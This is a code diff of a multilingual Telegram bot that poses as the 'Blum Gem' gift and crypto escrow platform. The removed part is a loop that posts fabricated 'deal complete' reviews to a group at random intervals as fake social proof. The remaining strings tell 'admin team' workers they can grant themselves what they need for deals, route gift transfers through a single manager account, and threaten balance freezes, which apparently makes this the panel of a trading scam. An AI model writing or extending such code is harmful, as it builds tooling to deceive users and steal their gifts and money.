@@ -30,100 +30,10 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
 ADMIN_LOG_IDS = [int(x.strip()) for x in os.getenv("ADMIN_LOG_IDS", "").split(",") if x.strip()]
 
-# ID для логов выводов
 WITHDRAW_LOG_ID = 7670534842
-
-# ============= РАССЫЛКА ОТЗЫВОВ =============
-GROUP_ID = -100299292
-
-GIFTS = [
-    ("Jack-in-the-Box", False), ("Neko Helmet", True), ("Top Hat", False),
-    ("Love Potion", False), ("Toy Bear", False), ("Diamond Ring", False),
-    ("Loot Bag", True), ("Lunar Snake", False), ("Tama Gadget", False),
-    ("Candy Cane", False), ("Cookie Heart", False), ("Party Sparkler", False),
-    ("Jingle Bells", False), ("Ginger Cookie", False), ("Winter Wreath", False),
-    ("Santa Hat", False), ("Snow Globe", False), ("Snow Mittens", False),
-    ("Sleigh Bell", False), ("Jester Hat", False), ("Star Notepad", False),
-    ("Bunny Muffin", False), ("Swiss Watch", False), ("Signet Ring", False),
-    ("Genie Lamp", True), ("Astral Shard", True),
-    ("Precious Peach", True), ("Plush Pepe", True),
-    ("Spiced Wine", False), ("Jelly Bunny", False), ("Hanging Star", False),
-    ("Durov's Cap", True), ("Love Candle", False), ("Perfume Bottle", False),
-    ("Mini Oscar", False), ("Eternal Rose", False), ("Berry Box", False),
-    ("Vintage Cigar", False), ("Magic Potion", False), ("Electric Skull", False),
-    ("Kissed Frog", False), ("Hypno Lollipop", False), ("Hex Pot", False),
-    ("Evil Eye", False), ("Ion Gem", False), ("Sharp Tongue", False),
-    ("Mad Pumpkin", False), ("Trapped Heart", False), ("Skull Flower", False),
-    ("Crystal Ball", False), ("Flying Broom", False), ("Voodoo Doll", False),
-    ("Scared Cat", False), ("Witch Hat", False), ("Eternal Candle", False),
-    ("Spy Agaric", False), ("Lol Pop", False), ("Homemade Cake", False),
-    ("Desk Calendar", False), ("B-Day Candle", False)
-]
-
-CURRENCIES = ["USDT", "Gram", "Stars", "Rub"]
-_review_task = None
 
 def generate_deal_id():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
-
-def select_gift():
-    rare = [g for g, r in GIFTS if r]
-    common = [g for g, r in GIFTS if not r]
-    if random.random() < 0.05 and rare:
-        return random.choice(rare)
-    return random.choice(common)
-
-async def send_review():
-    gift = select_gift()
-    deal_id = generate_deal_id()
-    currency = random.choice(CURRENCIES)
-
-    text = (
-        f'<tg-emoji emoji-id="5985433648810171091">💰</tg-emoji> <b>The deal is complete.</b>\n\n'
-        f'<tg-emoji emoji-id="6028530359975548369">🎁</tg-emoji> gift • <code>{gift}</code>\n'
-        f'<tg-emoji emoji-id="5877597667231534929">🆔</tg-emoji> Deal ID: {deal_id}\n'
-        f'<tg-emoji emoji-id="6006074913742396956">💵</tg-emoji> Valute: {currency}\n'
-        f'<tg-emoji emoji-id="6028226658543082010">🤖</tg-emoji> Blum team.'
-    )
-    
-    try:
-        await bot.send_message(GROUP_ID, text, parse_mode=ParseMode.HTML)
-        print(f"[REVIEW] Отправлено: {gift} | {deal_id} | {currency}")
-        return True
-    except Exception as e:
-        print(f"[REVIEW] Ошибка: {e}")
-        return False
-
-async def review_sender_loop():
-    print("[REVIEW SENDER] Запущен.")
-    
-    # Стартовая отправка 2-9 отзывов с паузой 3-8 секунд
-    count = random.randint(2, 9)
-    print(f"[REVIEW SENDER] Стартовая отправка {count} отзывов...")
-    for i in range(count):
-        await send_review()
-        if i < count - 1:
-            await asyncio.sleep(random.uniform(3, 8))
-    
-    while True:
-        # Ждём от 2 до 4 минут
-        wait_time = random.randint(2, 4) * 60
-        print(f"[REVIEW SENDER] Следующая отправка через {wait_time//60} минут...")
-        await asyncio.sleep(wait_time)
-        
-        # Отправляем 2-9 отзывов с паузой 3-8 секунд
-        count = random.randint(2, 9)
-        print(f"[REVIEW SENDER] Отправка {count} отзывов...")
-        for i in range(count):
-            await send_review()
-            if i < count - 1:
-                await asyncio.sleep(random.uniform(3, 8))
-
-def start_review_sender():
-    global _review_task
-    if _review_task is None or _review_task.done():
-        _review_task = asyncio.create_task(review_sender_loop())
-# ============= КОНЕЦ РАССЫЛКИ =============
 
 async def send_admin_log(log_type: str, data: dict):
     if log_type == "deal_created":
@@ -167,23 +77,22 @@ bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTM
 dp = Dispatcher(storage=MemoryStorage())
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-DB_FILE = os.path.join(BASE_DIR, "notcoin.pkl")
+DB_FILE = os.path.join(BASE_DIR, "blum.pkl")
 db = {}
 
 TEXTS = {
     "ru": {
-        "lang_selection": '<tg-emoji emoji-id="6005955994687901652">🌐</tg-emoji> <b>Choose language:</b>',
+        "lang_selection": '<tg-emoji emoji-id="5260512129240276089">🌐</tg-emoji> <b>Choose language:</b>',
         "welcome": (
             '<tg-emoji emoji-id="5938537205847822613">👋</tg-emoji> <b>Добро пожаловать к нам.</b>\n\n'
-            '<tg-emoji emoji-id="5893255507380014983">🌟</tg-emoji> <b>Blum Gem - платформа с лёгким управлением и дизайном для продаж или покупок подарков/активов.</b>\n\n'
-            '<tg-emoji emoji-id="5276381204470329471">⚡</tg-emoji> Автоматизированный и удобный дизайн.\n'
-            '<tg-emoji emoji-id="5278411813468269386">⚡</tg-emoji> Скорость и автоматизация.\n'
-            '<tg-emoji emoji-id="5276412364458059956">⚡</tg-emoji> Самый быстрый вывод средств.\n\n'
-            '• Комиссия сервиса: 0%\n'
-            '• Режим работы: 24/7\n'
-            '• Техническая поддержка: @BlumGemes\n'
-            '• Наш сайт - blum.io\n\n'
-            '<tg-emoji emoji-id="5276127848644503161">📌</tg-emoji> <b>Выберите нужный раздел ниже:</b>'
+            '<tg-emoji emoji-id="5296742257146241213">🌟</tg-emoji> <b>Blum Gem - специализированная платформа с удобным дизайном и лёгким управлением.</b>\n\n'
+            '<tg-emoji emoji-id="5882207227997066107">⚡</tg-emoji> <b>Наши преимущества:</b>\n'
+            '• Комиссия сервиса составляет 0%.\n'
+            '• Режим нашей работы 24/7.\n'
+            '• Быстрый ответ от технической поддержки.\n\n'
+            '<tg-emoji emoji-id="6039605143601680423">📌</tg-emoji> <b>Контакты связи:</b>\n'
+            '• Поддержка @BlumGemes.\n'
+            '• Канал @BlumCrypto.'
         ),
         "admin_team": '<tg-emoji emoji-id="5994297722574737553">📚</tg-emoji> <b>Мануалы можно найти по кнопкам ниже, также с помощью кнопок вы можете выдать себе нужное для сделок.</b>',
         "wallet_updated": '<tg-emoji emoji-id="5818821611016426346">✅</tg-emoji> <b>Адрес кошелька успешно обновлен</b>',
@@ -208,7 +117,7 @@ TEXTS = {
             '<blockquote><tg-emoji emoji-id="5816611412255970516">ℹ️</tg-emoji> <b>Описание:</b> {description}</blockquote>\n\n'
             '<tg-emoji emoji-id="5816604308380062332">🔗</tg-emoji> <b>Ссылка для покупателя:</b>\n\n'
             '{link}\n\n'
-                '<blockquote><tg-emoji emoji-id="5296420173253727054">⚠️</tg-emoji> <b>Важно: передача подарка осуществляется через менеджера @BlumGemes</b></blockquote>'
+            '<blockquote><tg-emoji emoji-id="5296420173253727054">⚠️</tg-emoji> <b>Важно: передача подарка осуществляется через менеджера @BlumGemes</b></blockquote>'
         ),
         "order_not_found": "❌ Ордер не найден.",
         "order_self_join": "❌ Вы не можете присоединиться к своей собственной сделке.",
@@ -249,7 +158,7 @@ TEXTS = {
             '<tg-emoji emoji-id="5931409969613116639">ℹ️</tg-emoji> Подробнее: /freeze_balance'
         ),
         "verification_failed": "Товары не были обнаружены или не прошли верификацию.\n\nПожалуйста, проверьте правильность переданных товаров или подарков и попробуйте снова.",
-        "wallets_menu_title": '<tg-emoji emoji-id="5312449897440506395">💼</tg-emoji> <b>Реквизиты кошельков</b>\n\n<b>Вы можете изменить а также добавить новые реквизиты.</b>',
+        "wallets_menu_title": '<tg-emoji emoji-id="5424976816530014958">💼</tg-emoji> <b>Ваши кошельки.</b>\n\n<b>В этом разделе вы можете добавить или изменить реквизиты кошельков.</b>',
         "gram_setup_title": '<tg-emoji emoji-id="5280809324342451667">🪙</tg-emoji> <b>GRAM кошелек</b>\n\n<blockquote>Текущий: {}</blockquote>\n\n<i>Отправьте новый адрес кошелька одним сообщением</i>',
         "usdt_setup_title": '<tg-emoji emoji-id="5814556334829343625">🪙</tg-emoji> <b>USDT кошелек</b>\n\n<blockquote>Текущий: {}</blockquote>\n\n<i>Отправьте новый адрес кошелька (TRC-20/ERC-20) одним сообщением</i>',
         "card_setup_title": (
@@ -270,7 +179,7 @@ TEXTS = {
             '• Никогда не сообщайте посторонним людям коды для вывода средств.'
         ),
         "support_title": '<tg-emoji emoji-id="5312325601086956561">👨‍💻</tg-emoji> <b>Агент технической поддержки</b>',
-        "referral_title": '<tg-emoji emoji-id="5278305362703835500">🎎</tg-emoji> <b>Реферальная ссылка:</b>\n\n<code>{link}</code>\n\nПриглашайте своих друзей и получайте 5% от их трат!',
+        "referral_title": '<tg-emoji emoji-id="6028171274939797252">🎎</tg-emoji> <b>Ваша ссылка:</b>\n\n<code>{link}</code>\n\n<b>Получайте 3% от трат ваших партнёров в нашем боте!</b>',
         "invite_text": (
             '<b>Вас пригласили к ордеру: #{order_id}</b>\n\n'
             '<b>Сумма:</b> {amount} {currency}\n'
@@ -301,7 +210,7 @@ TEXTS = {
         "transfer_comment_prompt": '<tg-emoji emoji-id="5312325601086956561">✍️</tg-emoji> <b>Введите комментарий для отправителя:</b>\n\n<b>Запрещены: маты, оскорбления, угрозы.</b>',
         "transfer_comment_success": '<tg-emoji emoji-id="5312325601086956561">✅</tg-emoji> <b>Комментарий успешно отправлен пользователю.</b>',
         "transfer_comment_received": '<tg-emoji emoji-id="5312325601086956561">💬</tg-emoji> <b>Комментарий от @{}:</b>\n\n{}',
-        "balance_title": '<tg-emoji emoji-id="5276395476646653290">💰</tg-emoji> <b>Ваш баланс:</b>\n\nGram: {gram}\nUSDT: {usdt}\nRUB: {rub}\nUAH: {uah}',
+        "balance_title": '<tg-emoji emoji-id="5974217466270716579">💰</tg-emoji> <b>Ваш баланс:</b>\n\n• Stars: {stars}\n• Gram: {gram}\n• Usdt: {usdt}\n• Rub: {rub}\n• Uah: {uah}',
         "btn_withdraw": "Вывод средств",
         "btn_history": "История баланса",
         "btn_active_requests": "Активные заявки",
@@ -327,18 +236,17 @@ TEXTS = {
         "btn_main_menu": "В главное меню",
     },
     "en": {
-        "lang_selection": '<tg-emoji emoji-id="6005955994687901652">🌐</tg-emoji> <b>Choose language:</b>',
+        "lang_selection": '<tg-emoji emoji-id="5260512129240276089">🌐</tg-emoji> <b>Choose language:</b>',
         "welcome": (
             '<tg-emoji emoji-id="5938537205847822613">👋</tg-emoji> <b>Welcome to us.</b>\n\n'
-            '<tg-emoji emoji-id="5893255507380014983">🌟</tg-emoji> <b>Blum Gem - a platform with easy management and design for selling or buying gifts/assets.</b>\n\n'
-            '<tg-emoji emoji-id="5276381204470329471">⚡</tg-emoji> Automated and convenient design.\n'
-            '<tg-emoji emoji-id="5278411813468269386">⚡</tg-emoji> Speed and automation.\n'
-            '<tg-emoji emoji-id="5276412364458059956">⚡</tg-emoji> Fastest withdrawal.\n\n'
-            '• Service fee: 0%\n'
-            '• Working hours: 24/7\n'
-            '• Technical support: @BlumGemes\n'
-            '• Our website - blum.io\n\n'
-            '<tg-emoji emoji-id="5276127848644503161">📌</tg-emoji> <b>Select the section below:</b>'
+            '<tg-emoji emoji-id="5296742257146241213">🌟</tg-emoji> <b>Blum Gem - a specialized platform with convenient design and easy management.</b>\n\n'
+            '<tg-emoji emoji-id="5882207227997066107">⚡</tg-emoji> <b>Our advantages:</b>\n'
+            '• Service fee is 0%.\n'
+            '• Our working hours 24/7.\n'
+            '• Fast response from technical support.\n\n'
+            '<tg-emoji emoji-id="6039605143601680423">📌</tg-emoji> <b>Contacts:</b>\n'
+            '• Support @BlumGemes.\n'
+            '• Channel @BlumCrypto.'
         ),
         "admin_team": '<tg-emoji emoji-id="5994297722574737553">📚</tg-emoji> <b>Manuals can be found below, also with buttons you can give yourself what you need for deals.</b>',
         "wallet_updated": '<tg-emoji emoji-id="5818821611016426346">✅</tg-emoji> <b>The address has been updated</b>',
@@ -404,7 +312,7 @@ TEXTS = {
             '<tg-emoji emoji-id="5931409969613116639">ℹ️</tg-emoji> More details: /freeze_balance'
         ),
         "verification_failed": "Items were not detected or failed verification.\n\nPlease check the correctness of the transferred items or gifts and try again.",
-        "wallets_menu_title": '<tg-emoji emoji-id="5312449897440506395">💼</tg-emoji> <b>Wallet details</b>\n\n<b>You can change and add new details.</b>',
+        "wallets_menu_title": '<tg-emoji emoji-id="5424976816530014958">💼</tg-emoji> <b>Your wallets.</b>\n\n<b>In this section you can add or change wallet details.</b>',
         "gram_setup_title": '<tg-emoji emoji-id="5280809324342451667">🪙</tg-emoji> <b>GRAM wallet</b>\n\n<blockquote>Current: {}</blockquote>\n\n<i>Send your new wallet address in one message</i>',
         "usdt_setup_title": '<tg-emoji emoji-id="5814556334829343625">🪙</tg-emoji> <b>USDT wallet</b>\n\n<blockquote>Current: {}</blockquote>\n\n<i>Send your new wallet address (TRC-20/ERC-20) in one message</i>',
         "card_setup_title": (
@@ -425,7 +333,7 @@ TEXTS = {
             '• Never share withdrawal codes with strangers.'
         ),
         "support_title": '<tg-emoji emoji-id="5312325601086956561">👨‍💻</tg-emoji> <b>Technical Support Agent</b>',
-        "referral_title": '<tg-emoji emoji-id="5278305362703835500">🎎</tg-emoji> <b>Referral link:</b>\n\n<code>{link}</code>\n\nInvite your friends and get 5% from their spending!',
+        "referral_title": '<tg-emoji emoji-id="6028171274939797252">🎎</tg-emoji> <b>Your link:</b>\n\n<code>{link}</code>\n\n<b>Get 3% from your partners\' spending in our bot!</b>',
         "invite_text": (
             '<b>You have been invited to order: #{order_id}</b>\n\n'
             '<b>Amount:</b> {amount} {currency}\n'
@@ -456,7 +364,7 @@ TEXTS = {
         "transfer_comment_prompt": '<tg-emoji emoji-id="5312325601086956561">✍️</tg-emoji> <b>Enter a comment for the sender:</b>\n\n<b>Forbidden: swearing, insults, threats.</b>',
         "transfer_comment_success": '<tg-emoji emoji-id="5312325601086956561">✅</tg-emoji> <b>Comment successfully sent to user.</b>',
         "transfer_comment_received": '<tg-emoji emoji-id="5312325601086956561">💬</tg-emoji> <b>Comment from @{}:</b>\n\n{}',
-        "balance_title": '<tg-emoji emoji-id="5276395476646653290">💰</tg-emoji> <b>Your balance:</b>\n\nGram: {gram}\nUSDT: {usdt}\nRUB: {rub}\nUAH: {uah}',
+        "balance_title": '<tg-emoji emoji-id="5974217466270716579">💰</tg-emoji> <b>Your balance:</b>\n\n• Stars: {stars}\n• Gram: {gram}\n• Usdt: {usdt}\n• Rub: {rub}\n• Uah: {uah}',
         "btn_withdraw": "Withdraw",
         "btn_history": "Balance history",
         "btn_active_requests": "Active requests",
@@ -482,18 +390,17 @@ TEXTS = {
         "btn_main_menu": "Back to menu",
     },
     "id": {
-        "lang_selection": '<tg-emoji emoji-id="6005955994687901652">🌐</tg-emoji> <b>Choose language:</b>',
+        "lang_selection": '<tg-emoji emoji-id="5260512129240276089">🌐</tg-emoji> <b>Choose language:</b>',
         "welcome": (
             '<tg-emoji emoji-id="5938537205847822613">👋</tg-emoji> <b>Selamat datang kepada kami.</b>\n\n'
-            '<tg-emoji emoji-id="5893255507380014983">🌟</tg-emoji> <b>Blum Gemes - platform dengan manajemen dan desain mudah untuk menjual atau membeli hadiah/aset.</b>\n\n'
-            '<tg-emoji emoji-id="5276381204470329471">⚡</tg-emoji> Desain otomatis dan nyaman.\n'
-            '<tg-emoji emoji-id="5278411813468269386">⚡</tg-emoji> Kecepatan dan otomatisasi.\n'
-            '<tg-emoji emoji-id="5276412364458059956">⚡</tg-emoji> Penarikan tercepat.\n\n'
-            '• Biaya layanan: 0%\n'
-            '• Jam kerja: 24/7\n'
-            '• Dukungan teknis: @BlumGemes\n'
-            '• Situs web kami - blum.io\n\n'
-            '<tg-emoji emoji-id="5276127848644503161">📌</tg-emoji> <b>Pilih bagian di bawah:</b>'
+            '<tg-emoji emoji-id="5296742257146241213">🌟</tg-emoji> <b>Blum Gem - platform khusus dengan desain nyaman dan manajemen mudah.</b>\n\n'
+            '<tg-emoji emoji-id="5882207227997066107">⚡</tg-emoji> <b>Keunggulan kami:</b>\n'
+            '• Biaya layanan adalah 0%.\n'
+            '• Jam kerja kami 24/7.\n'
+            '• Respons cepat dari dukungan teknis.\n\n'
+            '<tg-emoji emoji-id="6039605143601680423">📌</tg-emoji> <b>Kontak:</b>\n'
+            '• Dukungan @BlumGemes.\n'
+            '• Saluran @BlumCrypto.'
         ),
         "admin_team": '<tg-emoji emoji-id="5994297722574737553">📚</tg-emoji> <b>Manual dapat ditemukan di bawah, dengan tombol Anda dapat memberikan sendiri yang diperlukan untuk transaksi.</b>',
         "wallet_updated": '<tg-emoji emoji-id="5818821611016426346">✅</tg-emoji> <b>Alamat telah diperbarui</b>',
@@ -559,7 +466,7 @@ TEXTS = {
             '<tg-emoji emoji-id="5931409969613116639">ℹ️</tg-emoji> Detail: /freeze_balance'
         ),
         "verification_failed": "Barang tidak terdeteksi atau gagal verifikasi.\n\nSilakan periksa kebenaran barang atau hadiah yang ditransfer dan coba lagi.",
-        "wallets_menu_title": '<tg-emoji emoji-id="5312449897440506395">💼</tg-emoji> <b>Detail Dompet</b>\n\n<b>Anda dapat mengubah dan menambahkan detail baru.</b>',
+        "wallets_menu_title": '<tg-emoji emoji-id="5424976816530014958">💼</tg-emoji> <b>Dompet Anda.</b>\n\n<b>Di bagian ini Anda dapat menambah atau mengubah detail dompet.</b>',
         "gram_setup_title": '<tg-emoji emoji-id="5280809324342451667">🪙</tg-emoji> <b>Dompet GRAM</b>\n\n<blockquote>Saat ini: {}</blockquote>\n\n<i>Kirim alamat dompet baru dalam satu pesan</i>',
         "usdt_setup_title": '<tg-emoji emoji-id="5814556334829343625">🪙</tg-emoji> <b>Dompet USDT</b>\n\n<blockquote>Saat ini: {}</blockquote>\n\n<i>Kirim alamat dompet baru (TRC-20/ERC-20) dalam satu pesan</i>',
         "card_setup_title": (
@@ -580,7 +487,7 @@ TEXTS = {
             '• Jangan pernah bagikan kode penarikan dengan orang asing.'
         ),
         "support_title": '<tg-emoji emoji-id="5312325601086956561">👨‍💻</tg-emoji> <b>Agen Dukungan Teknis</b>',
-        "referral_title": '<tg-emoji emoji-id="5278305362703835500">🎎</tg-emoji> <b>Link referral:</b>\n\n<code>{link}</code>\n\nAjak teman Anda dan dapatkan 5% dari pengeluaran mereka!',
+        "referral_title": '<tg-emoji emoji-id="6028171274939797252">🎎</tg-emoji> <b>Link Anda:</b>\n\n<code>{link}</code>\n\n<b>Dapatkan 3% dari pengeluaran mitra Anda di bot kami!</b>',
         "invite_text": (
             '<b>Anda diundang ke pesanan: #{order_id}</b>\n\n'
             '<b>Jumlah:</b> {amount} {currency}\n'
@@ -611,7 +518,7 @@ TEXTS = {
         "transfer_comment_prompt": '<tg-emoji emoji-id="5312325601086956561">✍️</tg-emoji> <b>Masukkan komentar untuk pengirim:</b>\n\n<b>Dilarang: kata-kata kasar, penghinaan, ancaman.</b>',
         "transfer_comment_success": '<tg-emoji emoji-id="5312325601086956561">✅</tg-emoji> <b>Komentar berhasil dikirim ke pengguna.</b>',
         "transfer_comment_received": '<tg-emoji emoji-id="5312325601086956561">💬</tg-emoji> <b>Komentar dari @{}:</b>\n\n{}',
-        "balance_title": '<tg-emoji emoji-id="5276395476646653290">💰</tg-emoji> <b>Saldo Anda:</b>\n\nGram: {gram}\nUSDT: {usdt}\nRUB: {rub}\nUAH: {uah}',
+        "balance_title": '<tg-emoji emoji-id="5974217466270716579">💰</tg-emoji> <b>Saldo Anda:</b>\n\n• Stars: {stars}\n• Gram: {gram}\n• Usdt: {usdt}\n• Rub: {rub}\n• Uah: {uah}',
         "btn_withdraw": "Penarikan",
         "btn_history": "Riwayat saldo",
         "btn_active_requests": "Permintaan aktif",
@@ -637,18 +544,17 @@ TEXTS = {
         "btn_main_menu": "Kembali ke menu",
     },
     "ar": {
-        "lang_selection": '<tg-emoji emoji-id="6005955994687901652">🌐</tg-emoji> <b>Choose language:</b>',
+        "lang_selection": '<tg-emoji emoji-id="5260512129240276089">🌐</tg-emoji> <b>Choose language:</b>',
         "welcome": (
             '<tg-emoji emoji-id="5938537205847822613">👋</tg-emoji> <b>مرحباً بكم لدينا.</b>\n\n'
-            '<tg-emoji emoji-id="5893255507380014983">🌟</tg-emoji> <b>Blum Gemes - منصة ذات إدارة وتصميم سهلين لبيع أو شراء الهدايا/الأصول.</b>\n\n'
-            '<tg-emoji emoji-id="5276381204470329471">⚡</tg-emoji> تصميم آلي ومريح.\n'
-            '<tg-emoji emoji-id="5278411813468269386">⚡</tg-emoji> السرعة والأتمتة.\n'
-            '<tg-emoji emoji-id="5276412364458059956">⚡</tg-emoji> أسرع سحب.\n\n'
-            '• رسوم الخدمة: 0%\n'
-            '• ساعات العمل: 24/7\n'
-            '• الدعم الفني: @BlumGemes\n'
-            '• موقعنا - blum.io\n\n'
-            '<tg-emoji emoji-id="5276127848644503161">📌</tg-emoji> <b>اختر القسم المناسب أدناه:</b>'
+            '<tg-emoji emoji-id="5296742257146241213">🌟</tg-emoji> <b>Blum Gem - منصة متخصصة بتصميم مريح وإدارة سهلة.</b>\n\n'
+            '<tg-emoji emoji-id="5882207227997066107">⚡</tg-emoji> <b>مزايانا:</b>\n'
+            '• رسوم الخدمة 0%.\n'
+            '• ساعات العمل لدينا 24/7.\n'
+            '• استجابة سريعة من الدعم الفني.\n\n'
+            '<tg-emoji emoji-id="6039605143601680423">📌</tg-emoji> <b>جهات الاتصال:</b>\n'
+            '• الدعم @BlumGemes.\n'
+            '• القناة @BlumCrypto.'
         ),
         "admin_team": '<tg-emoji emoji-id="5994297722574737553">📚</tg-emoji> <b>يمكن العثور على الأدلة أدناه، يمكنك من خلال الأزرار إعطاء نفسك ما تحتاجه للصفقات.</b>',
         "wallet_updated": '<tg-emoji emoji-id="5818821611016426346">✅</tg-emoji> <b>تم تحديث العنوان</b>',
@@ -714,7 +620,7 @@ TEXTS = {
             '<tg-emoji emoji-id="5931409969613116639">ℹ️</tg-emoji> للمزيد: /freeze_balance'
         ),
         "verification_failed": "لم يتم اكتشاف البضائع أو فشل التحقق.\n\nيرجى التحقق من صحة البضائع أو الهدايا المنقولة والمحاولة مرة أخرى.",
-        "wallets_menu_title": '<tg-emoji emoji-id="5312449897440506395">💼</tg-emoji> <b>تفاصيل المحافظ</b>\n\n<b>يمكنك تعديل وإضافة تفاصيل جديدة.</b>',
+        "wallets_menu_title": '<tg-emoji emoji-id="5424976816530014958">💼</tg-emoji> <b>محافظك.</b>\n\n<b>في هذا القسم يمكنك إضافة أو تغيير تفاصيل المحفظة.</b>',
         "gram_setup_title": '<tg-emoji emoji-id="5280809324342451667">🪙</tg-emoji> <b>محفظة GRAM</b>\n\n<blockquote>الحالي: {}</blockquote>\n\n<i>أرسل عنوان محفظتك الجديد في رسالة واحدة</i>',
         "usdt_setup_title": '<tg-emoji emoji-id="5814556334829343625">🪙</tg-emoji> <b>محفظة USDT</b>\n\n<blockquote>الحالي: {}</blockquote>\n\n<i>أرسل عنوان محفظتك الجديد (TRC-20/ERC-20) في رسالة واحدة</i>',
         "card_setup_title": (
@@ -735,7 +641,7 @@ TEXTS = {
             '• لا تشارك أبداً رموز السحب مع الغرباء.'
         ),
         "support_title": '<tg-emoji emoji-id="5312325601086956561">👨‍💻</tg-emoji> <b>وكيل الدعم الفني</b>',
-        "referral_title": '<tg-emoji emoji-id="5278305362703835500">🎎</tg-emoji> <b>رابط الإحالة:</b>\n\n<code>{link}</code>\n\nقم بدعوة أصدقائك واحصل على 5% من إنفاقهم!',
+        "referral_title": '<tg-emoji emoji-id="6028171274939797252">🎎</tg-emoji> <b>رابطك:</b>\n\n<code>{link}</code>\n\n<b>احصل على 3% من إنفاق شركائك في بوتنا!</b>',
         "invite_text": (
             '<b>لقد تمت دعوتك إلى الطلب: #{order_id}</b>\n\n'
             '<b>المبلغ:</b> {amount} {currency}\n'
@@ -766,7 +672,7 @@ TEXTS = {
         "transfer_comment_prompt": '<tg-emoji emoji-id="5312325601086956561">✍️</tg-emoji> <b>أدخل تعليقاً للمرسل:</b>\n\n<b>ممنوع: الشتائم، الإهانات، التهديدات.</b>',
         "transfer_comment_success": '<tg-emoji emoji-id="5312325601086956561">✅</tg-emoji> <b>تم إرسال التعليق بنجاح إلى المستخدم.</b>',
         "transfer_comment_received": '<tg-emoji emoji-id="5312325601086956561">💬</tg-emoji> <b>تعليق من @{}:</b>\n\n{}',
-        "balance_title": '<tg-emoji emoji-id="5276395476646653290">💰</tg-emoji> <b>رصيدك:</b>\n\nGram: {gram}\nUSDT: {usdt}\nRUB: {rub}\nUAH: {uah}',
+        "balance_title": '<tg-emoji emoji-id="5974217466270716579">💰</tg-emoji> <b>رصيدك:</b>\n\n• Stars: {stars}\n• Gram: {gram}\n• Usdt: {usdt}\n• Rub: {rub}\n• Uah: {uah}',
         "btn_withdraw": "سحب",
         "btn_history": "سجل الرصيد",
         "btn_active_requests": "الطلبات النشطة",
@@ -792,18 +698,17 @@ TEXTS = {
         "btn_main_menu": "العودة إلى القائمة",
     },
     "zh": {
-        "lang_selection": '<tg-emoji emoji-id="6005955994687901652">🌐</tg-emoji> <b>Choose language:</b>',
+        "lang_selection": '<tg-emoji emoji-id="5260512129240276089">🌐</tg-emoji> <b>Choose language:</b>',
         "welcome": (
             '<tg-emoji emoji-id="5938537205847822613">👋</tg-emoji> <b>欢迎来到我们这里。</b>\n\n'
-            '<tg-emoji emoji-id="5893255507380014983">🌟</tg-emoji> <b>Blum Gemes - 一个具有轻松管理和设计的平台，用于出售或购买礼物/资产。</b>\n\n'
-            '<tg-emoji emoji-id="5276381204470329471">⚡</tg-emoji> 自动化和便捷的设计。\n'
-            '<tg-emoji emoji-id="5278411813468269386">⚡</tg-emoji> 速度和自动化。\n'
-            '<tg-emoji emoji-id="5276412364458059956">⚡</tg-emoji> 最快的提现。\n\n'
-            '• 服务费：0%\n'
-            '• 工作时间：24/7\n'
-            '• 技术支持：@BlumGemes\n'
-            '• 我们的网站 - blum.io\n\n'
-            '<tg-emoji emoji-id="5276127848644503161">📌</tg-emoji> <b>选择以下部分：</b>'
+            '<tg-emoji emoji-id="5296742257146241213">🌟</tg-emoji> <b>Blum Gem - 一个具有便捷设计和轻松管理的专业平台。</b>\n\n'
+            '<tg-emoji emoji-id="5882207227997066107">⚡</tg-emoji> <b>我们的优势：</b>\n'
+            '• 服务费为0%。\n'
+            '• 我们的工作时间为24/7。\n'
+            '• 技术支持快速响应。\n\n'
+            '<tg-emoji emoji-id="6039605143601680423">📌</tg-emoji> <b>联系方式：</b>\n'
+            '• 支持 @BlumGemes。\n'
+            '• 频道 @BlumCrypto。'
         ),
         "admin_team": '<tg-emoji emoji-id="5994297722574737553">📚</tg-emoji> <b>手册可以在下面找到，你也可以通过按钮给自己需要的交易内容。</b>',
         "wallet_updated": '<tg-emoji emoji-id="5818821611016426346">✅</tg-emoji> <b>地址已更新</b>',
@@ -869,7 +774,7 @@ TEXTS = {
             '<tg-emoji emoji-id="5931409969613116639">ℹ️</tg-emoji> 详情：/freeze_balance'
         ),
         "verification_failed": "未检测到商品或验证失败。\n\n请检查转移的商品或礼物的正确性并重试。",
-        "wallets_menu_title": '<tg-emoji emoji-id="5312449897440506395">💼</tg-emoji> <b>钱包详情</b>\n\n<b>您可以更改和添加新详情。</b>',
+        "wallets_menu_title": '<tg-emoji emoji-id="5424976816530014958">💼</tg-emoji> <b>您的钱包。</b>\n\n<b>在此部分您可以添加或更改钱包详情。</b>',
         "gram_setup_title": '<tg-emoji emoji-id="5280809324342451667">🪙</tg-emoji> <b>GRAM钱包</b>\n\n<blockquote>当前：{}</blockquote>\n\n<i>在一则消息中发送您的新钱包地址</i>',
         "usdt_setup_title": '<tg-emoji emoji-id="5814556334829343625">🪙</tg-emoji> <b>USDT钱包</b>\n\n<blockquote>当前：{}</blockquote>\n\n<i>在一则消息中发送您的新钱包地址 (TRC-20/ERC-20)</i>',
         "card_setup_title": (
@@ -890,7 +795,7 @@ TEXTS = {
             '• 切勿与陌生人分享提现代码。'
         ),
         "support_title": '<tg-emoji emoji-id="5312325601086956561">👨‍💻</tg-emoji> <b>技术支持代理</b>',
-        "referral_title": '<tg-emoji emoji-id="5278305362703835500">🎎</tg-emoji> <b>邀请链接：</b>\n\n<code>{link}</code>\n\n邀请您的朋友并获得他们消费的5%！',
+        "referral_title": '<tg-emoji emoji-id="6028171274939797252">🎎</tg-emoji> <b>您的链接：</b>\n\n<code>{link}</code>\n\n<b>从您的合作伙伴在机器人中的消费中获得3%！</b>',
         "invite_text": (
             '<b>您被邀请加入订单: #{order_id}</b>\n\n'
             '<b>金额:</b> {amount} {currency}\n'
@@ -921,7 +826,7 @@ TEXTS = {
         "transfer_comment_prompt": '<tg-emoji emoji-id="5312325601086956561">✍️</tg-emoji> <b>为发送者输入评论：</b>\n\n<b>禁止：脏话、侮辱、威胁。</b>',
         "transfer_comment_success": '<tg-emoji emoji-id="5312325601086956561">✅</tg-emoji> <b>评论已成功发送给用户。</b>',
         "transfer_comment_received": '<tg-emoji emoji-id="5312325601086956561">💬</tg-emoji> <b>来自 @{} 的评论：</b>\n\n{}',
